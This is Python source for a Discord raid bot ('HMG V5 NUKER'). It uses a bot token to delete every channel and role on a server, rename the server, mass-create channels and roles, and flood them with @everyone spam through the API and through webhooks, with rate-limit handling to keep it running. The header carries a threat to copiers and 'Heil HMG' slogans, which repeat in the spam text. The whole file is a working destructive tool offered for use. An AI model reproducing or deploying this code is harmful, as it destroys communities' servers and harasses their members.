# CODED BY JAK
# IF YOU SKID ILL FIND YOU
# HEIL HMG 

# imports
import discord
import os
import colorama
import random
import asyncio
import requests
import aiohttp
import json
from discord.ext import commands
from colorama import Fore as C
from colorama import Style as S
from colorama import Back as B

# customize
TOKEN = input("Token: ")
PREFIX = ">"
CHANNEL = "heil-hmg"
SPAM = """
```Nuked by the Guard | Heil HMG``` 
https://cdn.discordapp.com/attachments/1086450936295194625/1096192512554713138/lv_0_20230411200517.mp4
||@everyone||
https://discord.gg/rdXHweYQ7f
"""
ROLE = "Nuked By The Guard | Heil HMG"
SNAME = "NUKED BY HMG LMFAOOOO"
headers = {"Authorization": f"Bot {TOKEN}"}
WEBHOOK = "HEIL THE GUARD"
BANNER = f"""
{C.BLUE}╭╮╱╭┳━╮╭━┳━━━╮╭━╮╱╭╮╱╱╭╮╱╱╱╱╱╱╱╭╮╱╱╭┳━━━╮
{C.BLUE}┃┃╱┃┃┃╰╯┃┃╭━╮┃┃┃╰╮┃┃╱╱┃┃╱╱╱╱╱╱╱┃╰╮╭╯┃╭━━╯
{C.CYAN}┃╰━╯┃╭╮╭╮┃┃╱╰╯┃╭╮╰╯┣╮╭┫┃╭┳━━┳━╮╰╮┃┃╭┫╰━━╮
{C.LIGHTCYAN_EX}┃╭━╮┃┃┃┃┃┃┃╭━╮┃┃╰╮┃┃┃┃┃╰╯┫┃━┫╭╯╱┃╰╯┃╰━━╮┃
{C.LIGHTMAGENTA_EX}┃┃╱┃┃┃┃┃┃┃╰┻━┃┃┃╱┃┃┃╰╯┃╭╮┫┃━┫┃╱╱╰╮╭╯╭━━╯┃
{C.MAGENTA}╰╯╱╰┻╯╰╯╰┻━━━╯╰╯╱╰━┻━━┻╯╰┻━━┻╯╱╱╱╰╯╱╰━━━╯
"""
jak = commands.Bot(
  command_prefix=PREFIX,
  intents=discord.Intents.all(),
  help_command=None
)


# commands
@jak.command()
async def raid(ctx, *, amount):
    guild = ctx.guild
    channel_id = ctx.channel.id
    message = SPAM
    data = {
        'content': message
    }
    for x in range(int(amount)):
        response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=data)
        re = response.json()
        if response.status_code == 429:
            await asyncio.sleep(re['retry_after'])
        else:
            await ctx.send(message)


@jak.command()
async def mch(ctx):
    guild = ctx.guild
    guild_id = guild.id
    channelname = CHANNEL
    data = {
        'name': channelname,
        'type': 0
    }
    for x in range(50):
        response = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=data)
        re = response.json()
        if response.status_code == 429:
            await asyncio.sleep(re['retry_after'])
        else:
            channel_id = re['id']
            channel = await guild.create_text_channel(channelname)


@jak.command()
async def cdel(ctx):
    guild = ctx.guild
    channels = guild.channels
    channel_ids = [channel.id for channel in channels]

    for channel_id in channel_ids:
        response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
        if response.status_code == 429:
            await asyncio.sleep(response.json()['retry_after'])
        elif response.status_code == 204:
            print(f"Successfully deleted {channels}")
        else:
            print(f"Failed to delete {channels}. Status code: {response.status_code}")


@jak.command()
async def massrole(ctx):
    guild = ctx.guild
    role_name = ROLE
    role_data = {
        "name": role_name,
        "permissions": 0,
        "color": 0xFF0000
    }
  
    for x in range(100):
        response = requests.post(f"https://discord.com/api/v9/guilds/{guild.id}/roles", headers=headers, json=role_data)
        if response.status_code == 429:
            await asyncio.sleep(response.json()['retry_after'])
        elif response.status_code == 200:
            role_id = response.json()['id']
            print(f"{x} Roles Created: {role_name}")
        else:
            print(f"Failed to create role {role_name}. Status code: {response.status_code}")

@jak.command()
async def rdel(ctx):
    guild = ctx.guild
    roles = guild.roles
    role_id = [role.id for role in roles]
    role_name = guild.get_role(role_id)

    response = requests.delete(f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role_id}", headers=headers)

    if response.status_code == 429:
        await asyncio.sleep(response.json()['retry_after'])
    elif response.status_code == 204:
        print(f"Successfully deleted role {role_name}")
    else:
        print(f"Failed to delete role {role_name}. Status code: {response.status_code}")

@jak.command()
async def nuke(ctx):
  guild = ctx.guild
  try:
    await guild.edit(name=SNAME)
  except:
    print(f"Failed to edit server name!")
    pass

  tasks = [cdel(ctx), mch(ctx), rdel(ctx), massrole(ctx)]
  await asyncio.gather(*tasks)

@jak.command()
async def help(ctx):
    embed = discord.Embed(title="HMG V5 NUKER", color=discord.Color.blue())
    embed.add_field(name="Nuke", value="Nukes the server", inline=False)
    embed.add_field(name="Cdel", value="Deletes all channels", inline=False)
    embed.add_field(name="Mch", value="Spams 50 channels", inline=False)
    embed.add_field(name="Rdel", value="Deletes all roles", inline=False)
    embed.add_field(name="Massrole", value="Spams 100 roles", inline=False)
    embed.add_field(name="Raid", value="Spam Pings Server", inline=False)
    embed.set_footer(text="https://discord.gg/k24jYGW3")
    embed.set_author(name="Heil HMG", icon_url="https://media.discordapp.net/attachments/1094321176257503262/1104209578318647386/Untitled296_20221128195950.png")
    await ctx.send(embed=embed)

# events
@jak.event
async def on_guild_channel_create(channel):
    guild = channel.guild
    webhook_name = WEBHOOK

    response = requests.post(f"https://discord.com/api/v9/channels/{channel.id}/webhooks", headers=headers, json={"name": webhook_name})
    re = response.json()

    webhook_url = f"https://discord.com/api/webhooks/{re['id']}/{re['token']}"

    for i in range(20):
        message = {
            "content": SPAM,
            "username": webhook_name,
            "avatar_url": "https://media.discordapp.net/attachments/1094321176257503262/1104209578318647386/Untitled296_20221128195950.png"
        }
        requests.post(webhook_url, json=message)


@jak.event
async def on_ready():
  print(BANNER)
  print("online")

# bot run
try:
  jak.run(TOKEN)
except Exception as e:
  print(f"{e}")
